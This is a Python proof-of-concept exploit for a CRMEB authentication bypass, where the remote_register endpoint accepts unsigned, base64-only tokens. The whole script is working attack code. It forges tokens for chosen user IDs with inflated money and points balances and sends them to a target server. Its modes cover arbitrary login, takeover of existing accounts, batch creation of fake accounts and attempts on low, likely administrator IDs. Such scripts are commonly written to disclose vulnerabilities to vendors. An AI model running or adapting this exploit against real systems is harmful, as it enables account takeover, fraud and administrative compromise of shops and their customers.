#!/usr/bin/env python3
"""
CRMEB JWT Authentication Bypass POC
Vulnerability: Missing JWT signature verification in remote_register
CVSS Score: 9.8 (Critical)

This POC demonstrates that the remote_register endpoint only performs
base64 decoding without JWT signature verification, allowing attackers
to forge arbitrary tokens with any UID.
"""

import base64
import json
import requests
import time
import sys

# Target configuration
TARGET_URL = "http://192.168.176.130:8011"
REGISTER_ENDPOINT = "/api/remote_register"

def create_forged_token(uid, phone="", nickname="", now_money=999999, integral=999999):
    """
    Create a forged token without JWT signature
    Only base64 encoding required - NO SIGNATURE
    """
    forged_data = {
        "uid": uid,
        "phone": phone,
        "nickname": nickname,
        "avatar": "http://evil.com/avatar.jpg",
        "now_money": now_money,
        "integral": integral,
        "exp": 1770483564
    }

    # NO SIGNATURE REQUIRED - just base64 encoding
    fake_token = base64.urlsafe_b64encode(
        json.dumps(forged_data).encode()
    ).decode().rstrip('=')

    return fake_token, forged_data

def test_arbitrary_uid_login(target_uid):
    """
    POC 1: Login as arbitrary UID
    """
    print(f"\n[*] Testing arbitrary UID login: UID={target_uid}")

    url = TARGET_URL + REGISTER_ENDPOINT
    fake_token, forged_data = create_forged_token(
        uid=target_uid,
        phone=f"18888888888",
        nickname=f"hacker_{target_uid}"
    )

    print(f"[*] Forged Token (base64 only): {fake_token}")
    print(f"[*] Forged Data: {json.dumps(forged_data, indent=2)}")

    try:
        response = requests.get(url, params={"remote_token": fake_token}, timeout=10)

        print(f"\n[*] Response Status Code: {response.status_code}")
        print(f"[*] Response Body:\n{json.dumps(response.json(), indent=2, ensure_ascii=False)}")

        if response.status_code == 200:
            resp_data = response.json()
            if resp_data.get("msg") == "登录成功":
                print("\n[+] SUCCESS: UID authentication bypass confirmed!")
                print(f"[+] Logged in as UID: {target_uid}")
                print(f"[+] Received valid JWT token: {resp_data['data'].get('token', 'N/A')[:50]}...")
                return True, resp_data
            else:
                print(f"\n[-] Login failed with message: {resp_data.get('msg')}")
                return False, resp_data
        else:
            print(f"\n[-] HTTP Error: {response.status_code}")
            return False, None

    except requests.exceptions.RequestException as e:
        print(f"\n[-] Request failed: {e}")
        return False, None
    except Exception as e:
        print(f"\n[-] Error: {e}")
        return False, None

def test_uid_takeover(existing_uid):
    """
    POC 2: Account takeover using existing UID
    """
    print(f"\n[*] Testing account takeover: UID={existing_uid}")
    print("[*] Attempting to login as existing user...")

    url = TARGET_URL + REGISTER_ENDPOINT
    fake_token, forged_data = create_forged_token(
        uid=existing_uid,
        phone="",
        nickname=f"EVIL_HACKER"
    )

    print(f"[*] Forged Token: {fake_token}")
    print(f"[*] Forged Nickname: {forged_data['nickname']}")

    try:
        response = requests.get(url, params={"remote_token": fake_token}, timeout=10)

        if response.status_code == 200:
            resp_data = response.json()
            print(f"\n[*] Response: {json.dumps(resp_data, indent=2, ensure_ascii=False)}")

            if resp_data.get("msg") == "登录成功":
                print("\n[+] CRITICAL: Account takeover successful!")
                print(f"[+] Successfully logged in as existing UID: {existing_uid}")
                print(f"[+] Attacker received valid authentication token")
                return True, resp_data

        print(f"\n[-] Account takeover failed")
        return False, None

    except Exception as e:
        print(f"\n[-] Error: {e}")
        return False, None

def test_batch_uid_registration(start_uid, count):
    """
    POC 3: Batch registration with arbitrary UIDs
    """
    print(f"\n[*] Testing batch UID registration ({count} accounts)")

    successful = 0
    failed = 0
    results = []

    for i in range(count):
        target_uid = start_uid + i
        fake_token, forged_data = create_forged_token(
            uid=target_uid,
            phone=f"139001390{i:02d}",
            nickname=f"jwt_hacker_{i}",
            now_money=999999,
            integral=999999
        )

        try:
            response = requests.get(
                TARGET_URL + REGISTER_ENDPOINT,
                params={"remote_token": fake_token},
                timeout=10
            )

            if response.status_code == 200:
                resp_data = response.json()
                if resp_data.get("msg") == "登录成功":
                    print(f"[+] Account {i+1}: UID={target_uid}, Nickname={forged_data['nickname']}")
                    successful += 1
                    results.append({
                        'uid': target_uid,
                        'nickname': forged_data['nickname'],
                        'token': resp_data['data'].get('token', '')[:20]
                    })
                else:
                    print(f"[-] Account {i+1} failed: {resp_data.get('msg')}")
                    failed += 1
            else:
                print(f"[-] Account {i+1} HTTP error: {response.status_code}")
                failed += 1

        except Exception as e:
            print(f"[-] Account {i+1} error: {e}")
            failed += 1

        time.sleep(0.3)

    print(f"\n[*] Batch Registration Summary:")
    print(f"    Total: {count}")
    print(f"    Successful: {successful}")
    print(f"    Failed: {failed}")

    return results

def test_privilege_escalation():
    """
    POC 4: Test with admin/privileged UIDs
    """
    print(f"\n[*] Testing privilege escalation with low UIDs")

    privileged_uids = [1, 2, 3, 100]

    for uid in privileged_uids:
        print(f"\n[*] Attempting login as UID={uid} (potential admin)")
        success, resp = test_arbitrary_uid_login(uid)
        if success:
            print(f"[!] WARNING: Successfully logged in as privileged UID={uid}")

def main():
    print("=" * 70)
    print("CRMEB JWT Authentication Bypass - POC")
    print("=" * 70)
    print(f"Target: {TARGET_URL}")
    print(f"Vulnerability: Missing JWT signature verification")
    print("CVSS Score: 9.8 (Critical)")
    print("=" * 70)

    if len(sys.argv) > 1:
        command = sys.argv[1]

        if command == "uid":
            # Test specific UID
            target_uid = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
            test_arbitrary_uid_login(target_uid)

        elif command == "batch":
            # Batch registration
            start_uid = int(sys.argv[2]) if len(sys.argv) > 2 else 9000
            count = int(sys.argv[3]) if len(sys.argv) > 3 else 5
            test_batch_uid_registration(start_uid, count)

        elif command == "privilege":
            # Test privilege escalation
            test_privilege_escalation()

        else:
            # Treat as UID
            test_arbitrary_uid_login(int(command))
    else:
        # Default: run comprehensive tests
        print("\n### Test 1: Arbitrary UID Login (UID=8888) ###")
        test_arbitrary_uid_login(8888)

        print("\n" + "=" * 70)
        print("\n### Test 2: Account Takeover (UID=10) ###")
        test_uid_takeover(10)

        print("\n" + "=" * 70)
        print("\n### Test 3: Batch Registration (5 accounts) ###")
        test_batch_uid_registration(7000, 5)

        print("\n" + "=" * 70)
        print("\n### Test 4: Privilege Escalation ###")
        test_privilege_escalation()

        print("\n" + "=" * 70)
        print("Usage:")
        print("  python3 jwt_bypass_poc.py                    # Run all tests")
        print("  python3 jwt_bypass_poc.py uid <uid>          # Test specific UID")
        print("  python3 jwt_bypass_poc.py batch <start> <n>  # Batch registration")
        print("  python3 jwt_bypass_poc.py privilege          # Test privilege escalation")
        print("=" * 70)

if __name__ == "__main__":
    main()
